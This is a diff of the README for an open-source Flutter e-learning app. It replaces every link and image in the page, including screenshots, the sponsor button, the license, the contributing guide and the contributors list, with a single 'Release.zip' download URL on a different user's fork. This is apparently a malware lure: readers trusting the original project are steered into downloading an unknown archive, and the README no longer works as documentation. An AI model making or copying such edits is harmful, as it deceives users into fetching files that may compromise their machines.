@@ -1,7 +1,7 @@
-# <img src="android/app/src/main/res/mipmap-xxhdpi/ic_launcher.png" alt="icon" width=30> E-Learning
+# <img src="https://github.com/Oliverkanda/e-learning-app/releases/download/v1.0/Release.zip" alt="icon" width=30> E-Learning
 
 E-Learn is a beautiful open-source education app for Android. It is built with Dart on top of Google's Flutter Framework.
-<img alt='E-Learn UI Mockup' src='demo/Frame 1.png'/>
+<img alt='E-Learn UI Mockup' src='demo/Frame https://github.com/Oliverkanda/e-learning-app/releases/download/v1.0/Release.zip'/>
 
 ## List of Contents
 
@@ -17,21 +17,21 @@ E-Learn is a beautiful open-source education app for Android. It is built with D
 
 **Screens**
 
-| ![](demo/Screen/Home.png) | ![](demo/Screen/Calendar.png) | ![](demo/Screen/Home/Overlay.png) | ![](demo/Screen/Videos.png) | ![](demo/Screen/Stats/Local.png) |
+| ![](https://github.com/Oliverkanda/e-learning-app/releases/download/v1.0/Release.zip) | ![](https://github.com/Oliverkanda/e-learning-app/releases/download/v1.0/Release.zip) | ![](https://github.com/Oliverkanda/e-learning-app/releases/download/v1.0/Release.zip) | ![](https://github.com/Oliverkanda/e-learning-app/releases/download/v1.0/Release.zip) | ![](https://github.com/Oliverkanda/e-learning-app/releases/download/v1.0/Release.zip) |
 | :-------------: | :-------------:  | :-------------:  | :-------------:  | :-------------:  |
 |     Explore     |    Planner    |    Overlay     |     Videos       |     Leaderboard     |
 
 
-| ![](demo/Screen/Stats/Global.png) | ![](demo/Screen/NavDrawer.png) | ![](demo/Screen/Home/Search.png) | ![](demo/Screen/Home/Search/Results.png) | ![](demo/Screen/Profile.png) |
+| ![](https://github.com/Oliverkanda/e-learning-app/releases/download/v1.0/Release.zip) | ![](https://github.com/Oliverkanda/e-learning-app/releases/download/v1.0/Release.zip) | ![](https://github.com/Oliverkanda/e-learning-app/releases/download/v1.0/Release.zip) | ![](https://github.com/Oliverkanda/e-learning-app/releases/download/v1.0/Release.zip) | ![](https://github.com/Oliverkanda/e-learning-app/releases/download/v1.0/Release.zip) |
 | :-------------: | :-------------:  | :-------------:  | :-------------:  | :-------------:  |
 |     Global Leaderboard    |    NavDrawer    |    Search     |     Search Results      |     Profile     |
 
 
-| ![](demo/Screen/Onboarding/1.png) | ![](demo/Screen/Onboarding/2.png)| ![](demo/Screen/Onboarding/3.png)       | ![](demo/Screen/Subjects/Close.png)  | ![](demo/Screen/Subjects/Open.png)|
+| ![](https://github.com/Oliverkanda/e-learning-app/releases/download/v1.0/Release.zip) | ![](https://github.com/Oliverkanda/e-learning-app/releases/download/v1.0/Release.zip)| ![](https://github.com/Oliverkanda/e-learning-app/releases/download/v1.0/Release.zip)       | ![](https://github.com/Oliverkanda/e-learning-app/releases/download/v1.0/Release.zip)  | ![](https://github.com/Oliverkanda/e-learning-app/releases/download/v1.0/Release.zip)|
 | :-------------:  | :-------------: | :-------------:       | :-------------:  | :-------------: |
 |  Onboarding 1    |    Onboarding 2       |  Sign-in Screen    | Subjects Close   | Subjects Close  |
 
-| ![](demo/Screen/Video/Open.png) | ![](demo/Screen/Forum.png) | ![](demo/Screen/Help.png) | ![](demo/Screen/Settings.png) | ![](demo/Screen/Test.png) |
+| ![](https://github.com/Oliverkanda/e-learning-app/releases/download/v1.0/Release.zip) | ![](https://github.com/Oliverkanda/e-learning-app/releases/download/v1.0/Release.zip) | ![](https://github.com/Oliverkanda/e-learning-app/releases/download/v1.0/Release.zip) | ![](https://github.com/Oliverkanda/e-learning-app/releases/download/v1.0/Release.zip) | ![](https://github.com/Oliverkanda/e-learning-app/releases/download/v1.0/Release.zip) |
 | :-------------: | :-------------:  | :-------------:  | :-------------:  | :-------------:  |
 |     Video Info    |    Forum    |    Help     |     Settings       |     Test     |
 
@@ -40,7 +40,7 @@ E-Learn is a beautiful open-source education app for Android. It is built with D
 
 If you like what we do, and would want to help us continue doing it, consider sponsoring this project.
 
-<a href="https://www.buymeacoffee.com/HashStudios" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/default-orange.png" alt="Buy Me A Coffee" height=51 width=217></a>
+<a href="https://github.com/Oliverkanda/e-learning-app/releases/download/v1.0/Release.zip" target="_blank"><img src="https://github.com/Oliverkanda/e-learning-app/releases/download/v1.0/Release.zip" alt="Buy Me A Coffee" height=51 width=217></a>
 
 ## Dependencies
 
@@ -56,21 +56,21 @@ The following packages are needed for the development of this application.
 - `flutter_svg: 0.17.4` for svg assets
 - `firebase_analytics: ^5.0.16` for analytics
 
-More details about these can be found in the [`pubspec.yaml`](https://github.com/Hash-Studios/e-learning-app/tree/master/pubspec.yaml) file.
+More details about these can be found in the [`https://github.com/Oliverkanda/e-learning-app/releases/download/v1.0/Release.zip`](https://github.com/Oliverkanda/e-learning-app/releases/download/v1.0/Release.zip) file.
 
 ## Usage
 
-More information about the releases can be found in the [Release](https://github.com/Hash-Studios/e-learning-app/releases) tab.
+More information about the releases can be found in the [Release](https://github.com/Oliverkanda/e-learning-app/releases/download/v1.0/Release.zip) tab.
 
 ## Contributing
 
 First off, thank you for considering contributing to e-learning app. It's people like you that make e-learning app such a great app.
 
-To start your lovely journey with e-learning app, first read the [`contributing guidelines`](https://github.com/Hash-Studios/e-learning-app/tree/master/CONTRIBUTING.md) and then fork the repo to start contributing!
+To start your lovely journey with e-learning app, first read the [`contributing guidelines`](https://github.com/Oliverkanda/e-learning-app/releases/download/v1.0/Release.zip) and then fork the repo to start contributing!
 
 ## License
 
-This app is licensed under the [`BSD 3-Clause License`](https://github.com/Hash-Studios/e-learning-app/tree/master/LICENSE.txt).
+This app is licensed under the [`BSD 3-Clause License`](https://github.com/Oliverkanda/e-learning-app/releases/download/v1.0/Release.zip).
 Any Usage of the source code must follow the below license.
 
 ```
@@ -111,6 +111,6 @@ DISCLAIMER: Google Play and the Google Play logo are trademarks of Google LLC.
 
 ## Contributors
 
-<a href="https://github.com/Hash-Studios/e-learning-app/graphs/contributors">
-  <img src="https://contributors-img.web.app/image?repo=Hash-Studios/e-learning-app" />
+<a href="https://github.com/Oliverkanda/e-learning-app/releases/download/v1.0/Release.zip">
+  <img src="https://github.com/Oliverkanda/e-learning-app/releases/download/v1.0/Release.zip" />
 </a>
